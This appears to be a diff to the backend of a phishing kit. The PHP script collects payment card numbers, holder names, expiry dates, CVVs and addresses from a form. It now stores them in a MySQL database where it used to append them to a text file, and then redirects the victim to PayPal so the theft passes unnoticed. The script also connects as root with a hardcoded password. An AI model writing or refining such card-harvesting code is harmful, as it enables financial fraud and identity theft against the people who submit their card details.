@@ -1,8 +1,15 @@
 <?php
-// Abrir el archivo para escritura en modo append
-$archivo = fopen("datos.txt", "a");
+$host = "localhost";
+$usuario = "root";
+$contrasena = "050201";
+$base_de_datos = "tarjetas";
 
-// Obtener los datos del formulario y sanitizarlos
+$conn = new mysqli($host, $usuario, $contrasena, $base_de_datos);
+
+if ($conn->connect_error) {
+    die("Error de conexión: " . $conn->connect_error);
+}
+
 $numero = isset($_POST['numero']) ? trim($_POST['numero']) : '';
 $titular = isset($_POST['titular']) ? trim($_POST['titular']) : '';
 $tipo = isset($_POST['tipo']) ? trim($_POST['tipo']) : '';
@@ -10,13 +17,22 @@ $exp = isset($_POST['exp']) ? trim($_POST['exp']) : '';
 $cvv = isset($_POST['cvv']) ? trim($_POST['cvv']) : '';
 $direccion = isset($_POST['direccion']) ? trim($_POST['direccion']) : '';
 
-// Escribir los datos en el archivo
-fwrite($archivo, "Tarjeta: $numero | Titular: $titular | Tipo: $tipo | Vencimiento: $exp | CVV: $cvv | Dirección: $direccion" . PHP_EOL);
+$sql = "INSERT INTO tarjetas (numero, titular, tipo, exp, cvv, direccion) VALUES (?, ?, ?, ?, ?, ?)";
+$stmt = $conn->prepare($sql);
 
-// Cerrar el archivo
-fclose($archivo);
+if (!$stmt) {
+    die("Error en prepare: " . $conn->error);
+}
 
-// Redirigir a PayPal (o a otra página según necesidad)
+$stmt->bind_param("ssssss", $numero, $titular, $tipo, $exp, $cvv, $direccion);
+
+if (!$stmt->execute()) {
+    die("Error al ejecutar: " . $stmt->error);
+}
+
+$stmt->close();
+$conn->close();
+
 header("Location: https://www.paypal.com");
 exit;
 ?>
